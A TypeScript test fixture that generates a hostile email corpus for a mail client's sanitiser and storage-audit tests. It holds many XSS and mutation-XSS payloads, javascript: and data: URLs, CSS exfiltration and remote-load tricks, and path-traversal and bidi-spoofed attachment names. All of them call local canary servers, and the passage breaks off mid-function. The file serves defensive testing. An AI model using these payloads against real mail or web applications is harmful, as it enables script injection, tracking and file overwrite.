// The hostile mail corpus for hostile.spec.ts and storage-audit.spec.ts, built fresh for each run.
// Every URL in it points at the local canary servers (canary.ts): a script that ran, a form that
// submitted or a resource that loaded would reach them. Each message has a unique subject, sender
// and body word, so the storage audit can search for them as plaintext.
import { randomBytes } from "node:crypto";

import {
  CRLF,
  mailbox,
  messageDate,
  multipart,
  renderEntity,
  type Entity,
  type Header,
} from "../../dev/lib/mime.ts";

/** Characters that disguise or break a file name; written as code points, never as raw text. */
const RIGHT_TO_LEFT_OVERRIDE = String.fromCodePoint(0x202e);

const LEFT_TO_RIGHT_ISOLATE = String.fromCodePoint(0x2066);

const BELL = String.fromCodePoint(0x07);

const RIGHT_TO_LEFT_MARK = String.fromCodePoint(0x200f);

const ZERO_WIDTH_SPACE = String.fromCodePoint(0x200b);

/** The canary servers' origins: plain HTTP and HTTPS (a throwaway self-signed certificate). */
export interface CanaryOrigins {
  readonly http: string;
  readonly https: string;
}

/** What a canary URL's first path segment says the browser would have done. */
export type CanaryKind =
  | "script"
  | "img"
  | "style"
  | "font"
  | "frame"
  | "nav"
  | "form"
  | "media"
  | "prefetch";

/** An attachment of a corpus message and the name the app must save it under. */
export interface HostileAttachment {
  /** The file name as the sender wrote it. */
  readonly name: string;
  /** The name the download must get. */
  readonly savedAs: string;
  /** The name the attachment list shows (controls and bidi overrides replaced). */
  readonly shownAs: string;
  readonly contentType: string;
  readonly content: string;
}

export interface HostileMessage {
  readonly label: string;
  readonly subject: string;
  readonly fromName: string;
  readonly fromEmail: string;
  readonly messageId: string;
  /** A word only in this message's body. */
  readonly bodyWord: string;
  readonly attachments: readonly HostileAttachment[];
  /** The message as sent: 7-bit ASCII with CRLF line ends. */
  readonly raw: string;
}

export interface HostileCorpus {
  readonly run: string;
  readonly messages: readonly HostileMessage[];
  /** Every word of the corpus that must never be stored as plaintext. */
  readonly secrets: readonly string[];
  /** The message with this label. */
  readonly get: (label: string) => HostileMessage;
}

function base64Lines(text: string): string {
  return (
    Buffer.from(text, "utf8")
      .toString("base64")
      .match(/.{1,76}/gu) ?? []
  ).join(CRLF);
}

/** Base64 bodies, so no SMTP line limit splits a tag or a script. */
function htmlPart(html: string): Entity {
  return {
    headers: [
      ["Content-Type", "text/html; charset=utf-8"],
      ["Content-Transfer-Encoding", "base64"],
    ],
    body: base64Lines(html),
  };
}

function textPart(text: string): Entity {
  return {
    headers: [
      ["Content-Type", "text/plain; charset=utf-8"],
      ["Content-Transfer-Encoding", "base64"],
    ],
    body: base64Lines(text),
  };
}

/** An RFC 2231 parameter, so any Unicode file name survives a 7-bit message. */
function extendedParameter(name: string, value: string): string {
  const encoded = Array.from(Buffer.from(value, "utf8"), (byte) =>
    /[A-Za-z0-9._-]/u.test(String.fromCharCode(byte))
      ? String.fromCharCode(byte)
      : `%${byte.toString(16).toUpperCase().padStart(2, "0")}`,
  ).join("");

  return `${name}*=utf-8''${encoded}`;
}

function attachmentPart(
  attachment: HostileAttachment,
  extra: readonly Header[] = [],
  disposition = "attachment",
): Entity {
  return {
    headers: [
      [
        "Content-Type",
        `${attachment.contentType};${CRLF} ${extendedParameter("name", attachment.name)}`,
      ],
      [
        "Content-Disposition",
        `${disposition};${CRLF} ${extendedParameter("filename", attachment.name)}`,
      ],
      ["Content-Transfer-Encoding", "base64"],
      ...extra,
    ],
    body: base64Lines(attachment.content),
  };
}

/** The whole message: outer headers, then the body entity. */
function message(
  headers: {
    readonly fromName: string;
    readonly fromEmail: string;
    readonly to: string;
    readonly subject: string;
    readonly messageId: string;
    readonly date: Date;
  },
  body: Entity,
): string {
  const outer: Header[] = [
    ["From", mailbox(headers.fromName, headers.fromEmail)],
    ["To", headers.to],
    ["Subject", headers.subject],
    ["Date", messageDate(headers.date)],
    ["Message-ID", `<${headers.messageId}>`],
    ["MIME-Version", "1.0"],
    ...body.headers,
  ];

  const raw = renderEntity({ headers: outer, body: body.body });

  return raw.endsWith(CRLF) ? raw : `${raw}${CRLF}`;
}

/** Builds the corpus for one run. `to` is the dev user's address. */
export function hostileCorpus(origins: CanaryOrigins, to: string, now = new Date()): HostileCorpus {
  const run = randomBytes(4).toString("hex");
  const messages: HostileMessage[] = [];

  /** A canary URL: `/<kind>/<label>/<detail>` on the HTTP or the HTTPS canary. */
  const url = (scheme: "http" | "https", kind: CanaryKind, label: string, detail: string): string =>
    `${origins[scheme]}/${kind}/${label}/${detail}`;

  /** The script every hostile script runs: mark the canary global, then call the canary. */
  const payload = (label: string, detail: string): string =>
    `top.kastenCanary='${label}-${detail}';window.kastenCanary='${label}-${detail}';fetch('${url("http", "script", label, detail)}')`;

  const add = (
    label: string,
    build: (word: string, h: typeof url) => Entity,
    attachments: readonly HostileAttachment[] = [],
  ): void => {
    const bodyWord = `hostilebody${label.replace(/[^a-z]/gu, "")}${run}`;
    const subject = `Hostile ${label} ${run}`;
    const fromName = `Mallory ${label.replace(/[^a-z]/gu, "")} ${run}`;
    // A sender domain per run: the server throttles each sender domain per recipient (100/hour).
    const fromEmail = `mallory-${label}@run-${run}.hostile-sender.test`;
    const messageId = `hostile-${label}-${run}@hostile-sender.test`;
    const date = new Date(now.getTime() + messages.length * 1000);

    messages.push({
      label,
      subject,
      fromName,
      fromEmail,
      messageId,
      bodyWord,
      attachments,
      raw: message({ fromName, fromEmail, to, subject, messageId, date }, build(bodyWord, url)),
    });
  };

  add("scripts", (word) =>
    htmlPart(
      [
        `<!doctype html><html><head><script>${payload("scripts", "head")}</script></head><body>`,
        `<p>Script tags ${word}</p>`,
        `<script>${payload("scripts", "lower")}</script>`,
        `<SCRIPT>${payload("scripts", "upper")}</SCRIPT>`,
        `<ScRiPt type="text/javascript">${payload("scripts", "mixed")}</ScRiPt>`,
        `<script src="${url("http", "script", "scripts", "src.js")}"></script>`,
        `<script type="module">${payload("scripts", "module")}</script>`,
        `<scr<script>ipt>${payload("scripts", "split")}</scr</script>ipt>`,
        `<svg><script>${payload("scripts", "svg")}</script></svg>`,
        `<svg><script xlink:href="${url("http", "script", "scripts", "svg-src")}"></script></svg>`,
        `<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=${payload("scripts", "mxss")}>"></path></textarea></mtext></svg></mglyph></mi></math>`,
        `<noscript><p title="</noscript><img src=x onerror=${payload("scripts", "noscript")}>"></p></noscript>`,
        `<template><script>${payload("scripts", "template")}</script></template>`,
        `<form><math><mtext></form><form><mglyph><style></math><img src onerror=${payload("scripts", "form-mxss")}>`,
        `<xmp><script>${payload("scripts", "xmp")}</script></xmp>`,
        `<!--<script>${payload("scripts", "comment")}</script>-->`,
        `<p>End of the script tags.</p>`,
        `</body></html>`,
      ].join("\n"),
    ),
  );

  add("handlers", (word) =>
    htmlPart(
      [
        `<html><body onload="${payload("handlers", "body-onload")}">`,
        `<p>Event handlers ${word}</p>`,
        `<img src="${url("http", "img", "handlers", "onerror-src")}" onerror="${payload("handlers", "onerror")}" alt="broken">`,
        `<img src=x onerror=${payload("handlers", "onerror-bare")}>`,
        `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" onload="${payload("handlers", "img-onload")}" alt="pixel">`,
        `<div data-testid="hover-target" onmouseover="${payload("handlers", "mouseover")}" onmouseenter="${payload("handlers", "mouseenter")}" style="padding:24px;background:#fde">Hover target</div>`,
        `<svg onload="${payload("handlers", "svg-onload")}" width="20" height="20"><rect width="20" height="20" fill="#c33"/></svg>`,
        `<svg><animate onbegin="${payload("handlers", "animate")}" attributeName="x" dur="1s"/></svg>`,
        `<svg><set attributeName="onload" to="${payload("handlers", "svg-set")}"/></svg>`,
        `<details open ontoggle="${payload("handlers", "toggle")}"><summary>Details</summary>x</details>`,
        `<video><source onerror="${payload("handlers", "source")}"></video>`,
        `<input autofocus onfocus="${payload("handlers", "focus")}">`,
        `<marquee onstart="${payload("handlers", "marquee")}">m</marquee>`,
        `<a href="#top" onclick="${payload("handlers", "click")}">Click target</a>`,
        `<p style="width:expression(${payload("handlers", "expression")})">Expression</p>`,
        `</body></html>`,
      ].join("\n"),
    ),
  );

  add("urls", (word) =>
    htmlPart(
      [
        `<p>Dangerous URLs ${word}</p>`,
        `<p><a href="javascript:${payload("urls", "js")}">Link javascript</a></p>`,
        `<p><a href="JaVaScRiPt:${payload("urls", "js-case")}">Link javascript mixed case</a></p>`,
        `<p><a href=" &#x6A;avascript:${payload("urls", "js-entity")}">Link javascript entity</a></p>`,
        `<p><a href="java&#x09;script:${payload("urls", "js-tab")}">Link javascript tab</a></p>`,
        `<p><a href="data:text/html;base64,${Buffer.from(`<script>${payload("urls", "data-link")}</script>`).toString("base64")}">Link data</a></p>`,
        `<p><a href="vbscript:msgbox(&quot;urls&quot;)">Link vbscript</a></p>`,
        `<p><svg width="120" height="20"><a xlink:href="javascript:${payload("urls", "svg-xlink")}"><text x="0" y="15">Link svg</text></a></svg></p>`,
        `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" usemap="#m" width="40" height="40" alt="map"><map name="m"><area shape="rect" coords="0,0,40,40" href="javascript:${payload("urls", "area")}" alt="Area javascript"></map>`,
        `<form action="javascript:${payload("urls", "form-js")}"><button>Form javascript</button></form>`,
        `<form action="data:text/html,%3Cscript%3E${encodeURIComponent(payload("urls", "form-data"))}%3C/script%3E"><input type="submit" value="Form data"></form>`,
        `<form action="vbscript:msgbox(1)"><input type="submit" value="Form vbscript"></form>`,
        `<form><button formaction="javascript:${payload("urls", "formaction")}">Form formaction</button></form>`,
        `<iframe src="javascript:${payload("urls", "iframe")}"></iframe>`,
        `<object data="javascript:${payload("urls", "object")}"></object>`,
      ].join("\n"),
    ),
  );

  add("embeds", (word) =>
    htmlPart(
      [
        `<html><head><base href="${url("http", "nav", "embeds", "base/")}"></head><body>`,
        `<p>Embedded documents ${word}</p>`,
        `<iframe src="${url("http", "frame", "embeds", "iframe")}" width="50" height="20"></iframe>`,
        `<iframe src="${url("https", "frame", "embeds", "iframe-https")}"></iframe>`,
        `<iframe srcdoc="&lt;script&gt;${payload("embeds", "srcdoc")}&lt;/script&gt;"></iframe>`,
        `<object data="${url("http", "frame", "embeds", "object")}" type="text/html"></object>`,
        `<object data="${url("https", "frame", "embeds", "object-https.svg")}" type="image/svg+xml"></object>`,
        `<embed src="${url("http", "frame", "embeds", "embed")}" type="text/html">`,
        `<embed src="${url("https", "frame", "embeds", "embed-https.svg")}" type="image/svg+xml">`,
        `<applet code="Evil.class" codebase="${url("http", "frame", "embeds", "applet")}"></applet>`,
        `<portal src="${url("https", "frame", "embeds", "portal")}"></portal>`,
        `<frameset><frame src="${url("http", "frame", "embeds", "frame")}"></frameset>`,
        `<img src="relative-to-base.png" alt="relative image">`,
        `<p><a href="relative-link">Relative link</a></p>`,
        `</body></html>`,
      ].join("\n"),
    ),
  );

  add("navigation", (word) =>
    htmlPart(
      [
        `<html><head>`,
        `<meta http-equiv="refresh" content="0;url=${url("http", "nav", "navigation", "refresh")}">`,
        `<meta http-equiv="refresh" content="1; url=${url("https", "nav", "navigation", "refresh-https")}">`,
        `<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline'">`,
        `</head><body>`,
        `<meta http-equiv="refresh" content="0;url=${url("http", "nav", "navigation", "body-refresh")}">`,
        `<p>Forms and navigation ${word}</p>`,
        `<form id="post" action="${url("http", "form", "navigation", "post")}" method="post"><input name="secret" value="from-the-message"><button type="submit">Submit post form</button></form>`,
        `<form action="${url("https", "form", "navigation", "get")}"><input type="image" src="${url("https", "img", "navigation", "input-image")}" alt="Submit image form"><input type="submit" value="Submit get form"></form>`,
        `<button form="post" formaction="${url("http", "form", "navigation", "formaction")}">Submit formaction</button>`,
        `<p><a href="${url("https", "nav", "navigation", "link")}" ping="${url("http", "nav", "navigation", "ping")}">Ping link</a></p>`,
        `<isindex action="${url("http", "form", "navigation", "isindex")}">`,
        `</body></html>`,
      ].join("\n"),
    ),
  );

  add("css", (word) => {
    const escaped = Array.from(`${origins.http}/img/css/escaped`, (char) =>
      /[a-z]/u.test(char) ? `\\${char.charCodeAt(0).toString(16)} ` : char,
    ).join("");

    return htmlPart(
      [
        `<html><head><style>`,
        `@import url("${url("http", "style", "css", "import")}");`,
        `@import "${url("https", "style", "css", "import-https")}";`,
        `@font-face { font-family: Hostile; src: url("${url("http", "font", "css", "face")}") format("woff2"); }`,
        `@font-face { font-family: HostileHttps; src: url(${url("https", "font", "css", "face-https")}); }`,
        `body { font-family: Hostile, HostileHttps, sans-serif; }`,
        `.bg { background: url(${url("http", "img", "css", "background")}); }`,
        `.bgs { background-image: url("${url("https", "img", "css", "background-https")}"); }`,
        `.esc { background: url(${escaped}); }`,
        `.escfn { background-image: u\\72l(${url("http", "img", "css", "escaped-function")}); }`,
        `.set { background-image: image-set("${url("http", "img", "css", "image-set")}" 1x); }`,
        `.wset { background-image: -webkit-image-set(url(${url("http", "img", "css", "webkit-image-set")}) 1x); }`,
        `.cur { cursor: url(${url("http", "img", "css", "cursor")}), auto; }`,
        `.list { list-style-image: url(${url("http", "img", "css", "list")}); }`,
        `.border { border: 10px solid; border-image: url(${url("http", "img", "css", "border")}) 30; }`,
        `.mask { -webkit-mask-image: url(${url("http", "img", "css", "mask")}); mask-image: url(${url("http", "img", "css", "mask2")}); }`,
        `.content::before { content: url(${url("http", "img", "css", "content")}); }`,
        `.shape { float: left; shape-outside: url(${url("http", "img", "css", "shape")}); }`,
        `.filter { filter: url(${url("http", "img", "css", "filter")}#f); }`,
        `.clip { clip-path: url(${url("http", "img", "css", "clip")}#c); }`,
        `.var { --hostile: url(${url("http", "img", "css", "custom-property")}); background-image: var(--hostile); }`,
        `.nest { color: #333; & .inner { background: url(${url("http", "img", "css", "nested")}); } }`,
        `@media all { .media { background: url(${url("http", "img", "css", "media")}); } }`,
        `@supports (display: block) { .supports { background: url(${url("http", "img", "css", "supports")}); } }`,
        `@layer hostile { .layer { background: url(${url("http", "img", "css", "layer")}); } }`,
        `@container (min-width: 1px) { .container { background: url(${url("http", "img", "css", "container")}); } }`,
        `@keyframes hostile { from { background: url(${url("http", "img", "css", "keyframes")}); } } .anim { animation: hostile 1s infinite; }`,
        `@counter-style hostile { system: cyclic; symbols: url(${url("http", "img", "css", "counter-style")}); } ol { list-style: hostile; }`,
        `@page { background: url(${url("http", "img", "css", "page")}); }`,
        `@page { background: var(--unset, image-set('${url("https", "img", "css", "hidden-page")}' 1x)); }`,
        // var(), env() and if() keep their raw text, escapes, comments and single quotes, until
        // the frame substitutes them. "hidden-" URLs never load, not even after Show.
        `.hidden { background: var(--unset, u\\72l(${url("https", "img", "css", "hidden-rule")})); }`,
        `.hidden::after { content: var(--unset, u\\72l(${url("https", "img", "css", "hidden-content")})); }`,
        `.hidden-quote { background-image: var(--unset, image-set('${url("https", "img", "css", "hidden-rule-quote")}' 1x)); }`,
        `.hidden-comment { background-image: var(--unset, image-set(/*"data:,*/'${url("https", "img", "css", "hidden-rule-comment")}' 1x/*"*/)); }`,
        // An escape can spell the substitution function itself: v\61r( is var(.
        `.hidden-escaped-name { background: v\\61r(--unset, image-set('${url("https", "img", "css", "hidden-rule-escaped-name")}' 1x)); }`,
        // A style rule's nested rules, the declarations in a nested @media and those after a
        // nested rule are cleaned like the rest: plain URLs count, raw text that could load goes.
        `.nest-https { & .inner { background-image: url(${url("https", "img", "css", "nested-https")}); } }`,
        `.nest-set { & .inner { background-image: image-set("${url("https", "img", "css", "nested-image-set")}" 1x); } }`,
        `.nest-quote { & .inner { background: var(--unset, image-set('${url("https", "img", "css", "hidden-nested-quote")}' 1x)); } }`,
        `.nest-escaped-name { & .inner { background: v\\61r(--unset, image-set('${url("https", "img", "css", "hidden-nested-escaped-name")}' 1x)); } }`,
        `.nest-media-rule { @media all { & .inner { background: var(--unset, image-set('${url("https", "img", "css", "hidden-nested-media-rule")}' 1x)); } } }`,
        `.nest-media { @media all { background: v\\61r(--unset, image-set('${url("https", "img", "css", "hidden-nested-media")}' 1x)); } }`,
        `.nest-after { & .inner { color: #333; } background: var(--unset, image-set('${url("https", "img", "css", "hidden-nested-after-rule")}' 1x)); }`,
        `</style>`,
        // An element of its own: DOMPurify removes any element whose text looks like a tag, so
        // "<image>" would take the whole stylesheet above with it, unchecked by the sanitiser.
        `<style>@property --picture { syntax: "<image>"; inherits: false; initial-value: url(${url("http", "img", "css", "property")}); }</style>`,
        `</head><body style="background-image: var(--unset, u\\72l(${url("https", "img", "css", "hidden-body")}))">`,
        `<p>Remote CSS ${word}</p>`,
        `<style media="print">.print-only { display: block; }</style>`,
        `<div class="var nest media supports layer container anim"><span class="inner">grouped rules</span></div>`,
        ...["nest-https", "nest-set", "nest-quote", "nest-escaped-name", "nest-media-rule"].map(
          (name) =>
            `<div class="${name}"><div class="inner" style="width:20px;height:20px">${name}</div></div>`,
        ),
        `<div class="nest-media" style="width:20px;height:20px">nest-media</div>`,
        `<div class="nest-after" style="width:20px;height:20px"><span class="inner">nest-after</span></div>`,
        `<ol><li>counter</li></ol>`,
        `<div style="--x: url(${url("http", "img", "css", "style-custom-property")}); background-image: var(--x); width: 20px; height: 20px">style custom property</div>`,
        `<img src="  ${url("http", "img", "css", "leading-space")}" alt="leading space">`,
        `<img src="${url("http", "img", "css", "backslash").replace("http://", "\\\\")}" alt="backslash">`,
        `<img src="HtTp://${url("http", "img", "css", "mixed-case").slice("http://".length)}" alt="mixed case">`,
        `<img srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg== 1x, ${url("http", "img", "css", "srcset-later")} 2x" alt="srcset later">`,
        `<svg width="20" height="20"><rect fill="url(${url("http", "img", "css", "svg-fill-attribute")}#p)" filter="url(${url("http", "img", "css", "svg-filter-attribute")}#f)" mask="u\\72l(${url("http", "img", "css", "svg-mask-escaped")})" width="5" height="5"/></svg>`,
        `<style>@import url(${url("http", "style", "css", "body-import")}); .late { background: url(${url("http", "img", "css", "body-style")}); }</style>`,
        `<div class="bg bgs esc escfn set wset cur list border mask content shape filter clip late" style="width:60px;height:60px">css</div>`,
        `<div style="background-image:url('${url("http", "img", "css", "style-attribute")}');width:20px;height:20px">style attribute</div>`,
        `<div style="background:url(${url("https", "img", "css", "style-attribute-https")});width:20px;height:20px">style attribute https</div>`,
        `<div style="background:image-set('${url("http", "img", "css", "style-image-set")}' 1x);width:20px;height:20px">style image-set</div>`,
        `<div class="hidden hidden-quote hidden-comment hidden-escaped-name" style="background-image:var(--unset, u\\72l(${url("https", "img", "css", "hidden-var")}));width:20px;height:20px">var escape</div>`,
        `<div style="background-image:var(--unset, image-set('${url("https", "img", "css", "hidden-var-quote")}' 1x));width:20px;height:20px">var quote</div>`,
        `<div style="background-image:var(--unset, -webkit-image-set('${url("https", "img", "css", "hidden-var-webkit-quote")}' 1x));width:20px;height:20px">var -webkit-image-set quote</div>`,
        `<div style="background-image:var(--unset, image('${url("https", "img", "css", "hidden-var-image-quote")}'));width:20px;height:20px">var image quote</div>`,
        `<div style="background-image:var(--unset, cross-fade('${url("https", "img", "css", "hidden-var-cross-fade-quote")}' 50%, white));width:20px;height:20px">var cross-fade quote</div>`,
        `<div style="background-image:env(--unset, image-set('${url("https", "img", "css", "hidden-env-quote")}' 1x));width:20px;height:20px">env quote</div>`,
        `<div style="background-image:if(media(width > 0): image-set('${url("https", "img", "css", "hidden-if-quote")}' 1x); else: none);width:20px;height:20px">if quote</div>`,
        // A quote in a comment pairs with the next one for a pattern, but not for the frame.
        `<div style="background-image:var(--unset, image-set(/*&quot;data:,*/'${url("https", "img", "css", "hidden-var-comment")}' 1x/*&quot;*/));width:20px;height:20px">var comment</div>`,
        `<div style="background:var(--unset, image-set('${url("https", "img", "css", "hidden-shorthand-quote")}' 1x));width:20px;height:20px">var shorthand quote</div>`,
        // A later longhand hides the shorthand's text from cssText, but not from the attribute.
        `<div style="background:var(--unset, url(${url("https", "img", "css", "hidden-shorthand-override")}));background-color:#fff;width:20px;height:20px">var shorthand override</div>`,
        `<div style="mask:var(--unset, none);-webkit-mask-box-image:var(--unset, url(${url("https", "img", "css", "hidden-mask-box")}) 30);-webkit-mask-box-image-slice:1;width:20px;height:20px">var mask-box-image override</div>`,
        // Chromium shows an important longhand that waits for a substitution as `name:  !important;`.
        `<div style="mask:var(--unset, none);-webkit-mask-box-image:var(--unset, url(${url("https", "img", "css", "hidden-mask-box-important")}) 30) !important;-webkit-mask-box-image-slice:1 !important;width:20px;height:20px">var mask-box-image important</div>`,
        // Shorthands whose raw text cannot load stay, so the mail keeps its layout.
        `<div class="kept-var-shorthands" style="border-radius:var(--r, 4px);gap:var(--g, 8px);inset:var(--i, 0);place-items:var(--p, center);font:var(--f, 14px serif)">kept var shorthands</div>`,
        `<div style="background:var(--unset, u\\000072l(${url("https", "img", "css", "hidden-shorthand")}));width:20px;height:20px">var shorthand escape</div>`,
        `<div style="background:v\\61r(--unset, image-set('${url("https", "img", "css", "hidden-shorthand-escaped-var")}' 1x));width:20px;height:20px">escaped var name</div>`,
        `<div style="background:\\65nv(--unset, image-set('${url("https", "img", "css", "hidden-shorthand-escaped-env")}' 1x));width:20px;height:20px">escaped env name</div>`,
        // Escapes of letters that are not hex digits spell names too: \va\r( is var(.
        `<div style="background:\\va\\r(--unset, \\u\\r\\l(${url("https", "img", "css", "hidden-shorthand-escaped-letters")}));width:20px;height:20px">escaped letters</div>`,
        `<div style="background-image:env(--unset, u\\rl(${url("https", "img", "css", "hidden-env")}));width:20px;height:20px">env escape</div>`,
        `<div style="background-image:if(media(width > 0): u\\72l(${url("https", "img", "css", "hidden-if")}); else: none);width:20px;height:20px">if escape</div>`,
        `<math style="display:block;width:20px;height:20px;background-image:var(--unset, u\\72l(${url("https", "img", "css", "hidden-mathml")}))"><mi>m</mi></math>`,
        `<svg width="20" height="20"><rect width="20" height="20" mask="image-set('${url("https", "img", "css", "hidden-svg-image-set")}' 1x)"/><rect width="20" height="20" mask="-webkit-image-set('${url("https", "img", "css", "hidden-svg-webkit-image-set")}' 1x)"/></svg>`,
        `<img srcset="${url("http", "img", "css", "srcset")} 1x, ${url("https", "img", "css", "srcset-https")} 2x" alt="srcset">`,
        `<picture><source srcset="${url("https", "img", "css", "picture-source")}" type="image/png"><source srcset="${url("http", "img", "css", "picture-source-http")}"><img src="${url("https", "img", "css", "picture-img")}" alt="picture"></picture>`,
        `<video poster="${url("https", "img", "css", "poster")}" src="${url("http", "media", "css", "video")}" width="20" height="20"></video>`,
        `<video><source src="${url("http", "media", "css", "video-source")}"><track src="${url("http", "media", "css", "track")}"></video>`,
        `<audio src="${url("http", "media", "css", "audio")}"></audio>`,
        `<video src="${url("https", "media", "css", "video-https")}" width="20" height="20"></video>`,
        `<audio><source src="${url("https", "media", "css", "audio-source-https")}"></audio>`,
        `<link rel="stylesheet" href="${url("http", "style", "css", "link-stylesheet")}">`,
        `<link rel="prefetch" href="${url("http", "prefetch", "css", "prefetch")}">`,
        `<link rel="dns-prefetch" href="//dns-prefetch.hostile-sender.test">`,
        `<link rel="preconnect" href="${origins.http}">`,
        `<link rel="preload" as="image" href="${url("http", "prefetch", "css", "preload")}">`,
        `<link rel="modulepreload" href="${url("http", "script", "css", "modulepreload")}">`,
        `<link rel="icon" href="${url("http", "img", "css", "icon")}">`,
        `<table background="${url("http", "img", "css", "table-background")}"><tr><td background="${url("https", "img", "css", "td-background")}">cell</td></tr></table>`,
        `<img src="${url("https", "img", "css", "plain-https")}" alt="plain remote image">`,
        `<img src="//127.0.0.1:1/img/css/protocol-relative" alt="protocol relative">`,
        `<img lowsrc="${url("http", "img", "css", "lowsrc")}" dynsrc="${url("http", "media", "css", "dynsrc")}" alt="lowsrc">`,
        `<input type="image" src="${url("http", "img", "css", "input-image")}" alt="input image">`,
        `<svg width="20" height="20"><image href="${url("http", "img", "css", "svg-image")}" width="10" height="10"/><image xlink:href="${url("https", "img", "css", "svg-xlink-https")}" width="10" height="10"/><use href="${url("http", "img", "css", "svg-use")}#x"/><filter id="f"><feImage href="${url("http", "img", "css", "svg-feimage")}"/></filter><style>@import url(${url("http", "style", "css", "svg-import")}); rect { fill: url(${url("http", "img", "css", "svg-fill")}#p); }</style><rect width="5" height="5"/></svg>`,
        `</body></html>`,
      ].join("\n"),
    );
  });

  add("exfil", (word) =>
    htmlPart(
      [
        `<html><head><style>`,
        `a[href^="https://a"] { background: url(${url("https", "img", "exfil", "attribute-a")}); }`,
        `input[value^="s"] { background: url(${url("http", "img", "exfil", "input-s")}); }`,
        `body:has(.secret) { background: url(${url("http", "img", "exfil", "has")}); }`,
        `a:visited { background: url(${url("http", "img", "exfil", "visited")}); }`,
        `@font-face { font-family: leak; src: url(${url("http", "font", "exfil", "unicode-a")}); unicode-range: U+0041; }`,
        `@font-face { font-family: leak; src: url(${url("https", "font", "exfil", "unicode-b")}); unicode-range: U+0042; }`,
        `.leak { font-family: leak; }`,
        `</style></head><body>`,
        `<p>CSS exfiltration ${word}</p>`,
        `<p class="leak">AB secret text</p>`,
        `<a href="https://a.hostile-sender.test/">A link</a>`,
        `<input value="secret"><span class="secret">secret</span>`,
        `</body></html>`,
      ].join("\n"),
    ),
  );

  add("cid", (word) =>
    multipart("related", [
      htmlPart(
        [
          `<p>A missing inline part ${word}</p>`,
          `<img src="cid:missing-part@hostile-sender.test" alt="missing inline image">`,
          `<table background="cid:also-missing@hostile-sender.test"><tr><td>cell</td></tr></table>`,
          `<div style="background:url(cid:missing-style@hostile-sender.test)">style</div>`,
        ].join("\n"),
      ),
    ]),
  );

  // The message's only remote image, at a URL whose text looks like a substitution function: it
  // counts for "Remote images blocked", so Show is offered and loads it.
  add("parens", (word) =>
    htmlPart(
      [
        `<p>A remote image with parentheses ${word}</p>`,
        `<div style="background-image:url('${url("https", "img", "parens", "a--b/c(1).gif(2).png")}');width:20px;height:20px">parens</div>`,
      ].join("\n"),
    ),
  );

  add("deep", (word) => {
    const depth = 10_000;
    const open = Array.from({ length: depth / 50 }, () => "<div>".repeat(50)).join("\n");
    const close = Array.from({ length: depth / 50 }, () => "</div>".repeat(50)).join("\n");

    return htmlPart(`<p>Deep nesting ${word}</p>\n${open}\n<p>The deepest paragraph</p>\n${close}`);
  });

  add("large", (word) => {
    const lines = [`<p>A large part ${word}</p>`];
    let size = 0;

    for (let line = 0; size < 5 * 1024 * 1024; line += 1) {
      const text = `<p>Line ${line}: a long newsletter goes on and on so that the HTML part reaches five megabytes.</p>`;

      lines.push(text);
      size += text.length + 2;
    }

    lines.push(`<img src="${url("http", "img", "large", "late-image")}" alt="late image">`);
    lines.push(`<p>The end of the large part.</p>`);

    return htmlPart(lines.join("\n"));
  });

  const htmlAttachment: HostileAttachment = {
    name: "invoice.html",
    savedAs: "invoice.html",
    shownAs: "invoice.html",
    contentType: "text/html",
    content: `<html><body><script>${payload("attachment", "html")}</script><img src="${url("http", "img", "attachment", "html")}">HTML attachment content ${run}</body></html>`,
  };

  add(
    "attachment",
    (word) =>
      multipart("mixed", [textPart(`An HTML attachment ${word}`), attachmentPart(htmlAttachment)]),
    [htmlAttachment],
  );

  const named = (
    name: string,
    savedAs: string,
    shownAs: string,
    contentType = "application/octet-stream",
  ): HostileAttachment => ({
    name,
    savedAs,
    shownAs,
    contentType,
    content: `Attachment content ${run} ${randomBytes(4).toString("hex")}`,
  });

  const longName = `${"a".repeat(296)}.pdf`;

  const names: readonly HostileAttachment[] = [
    named(`Invoice${RIGHT_TO_LEFT_OVERRIDE}fdp.exe`, "Invoice_fdp.exe", "Invoice_fdp.exe"),
    named("../../../.ssh/authorized_keys", "authorized_keys", "../../../.ssh/authorized_keys"),
    named("..\\..\\Windows\\System32\\evil.dll", "evil.dll", "..\\..\\Windows\\System32\\evil.dll"),
    named("setup.exe", "setup.exe", "setup.exe", "application/x-msdownload"),
    named(
      `report${RIGHT_TO_LEFT_MARK}${ZERO_WIDTH_SPACE}fdp.txt`,
      "report__fdp.txt",
      "report__fdp.txt",
      "text/plain",
    ),
    named(longName, `${"a".repeat(146)}.pdf`, longName, "application/pdf"),
    named("CON.txt", "_CON.txt", "CON.txt", "text/plain"),
    named(".htaccess", "htaccess", ".htaccess", "text/plain"),
    named(
      `bell${BELL}${LEFT_TO_RIGHT_ISOLATE}name.txt`,
      "bell__name.txt",
      "bell__name.txt",
      "text/plain",
    ),
  ];

  add(
    "filenames",
    (word) =>
      multipart("mixed", [
        textPart(`Dangerous attachment names ${word}`),
        ...names.map((attachment) => attachmentPart(attachment)),
      ]),
    names,
  );

  const spoofed: HostileAttachment = {
    name: "photo.png",
    savedAs: "photo.png",
    shownAs: "photo.png",
    contentType: "image/png",
    content: `<!doctype html><html><body><script>${payload("spoof", "png")}</script><img src="${url("http", "img", "spoof", "png")}">Spoofed content ${run}</body></html>`,
  };

  add(
    "spoof",
    (word) =>
      multipart("mixed", [
        multipart("related", [
          htmlPart(
            `<p>A Content-Type spoof ${word}</p><img src="cid:spoof-${run}@hostile-sender.test" alt="spoofed inline">`,
          ),
          attachmentPart(spoofed, [["Content-ID", `<spoof-${run}@hostile-sender.test>`]], "inline"),
        ]),
        attachmentPart(spoofed),
      ]),
    [spoofed],
  );

  add("headers", (word) =>
    textPart(
      `Hostile headers ${word}\n<script>${payload("headers", "text")}</script>\nhttps://ok.hostile-sender.test/ javascript:${payload("headers", "text-link")}`,
    ),
  );

  // The subject and the sender name carry HTML as text: the app must show it, never parse it.
  const last = messages.at(-1);

